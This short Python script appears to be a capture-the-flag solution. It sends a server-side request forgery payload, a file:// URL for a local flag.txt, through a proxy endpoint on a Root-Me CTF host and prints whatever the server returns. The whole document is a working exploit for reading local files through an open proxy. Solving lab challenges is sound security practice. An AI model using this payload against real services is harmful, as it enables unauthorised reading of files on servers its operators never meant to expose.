#!/usr/bin/env python3
import requests

body = "file://127.0.0.1:3000/flag.txt"
r = requests.get(f"http://ctf10k.root-me.org:6005/proxy?{body}")
print(r.text)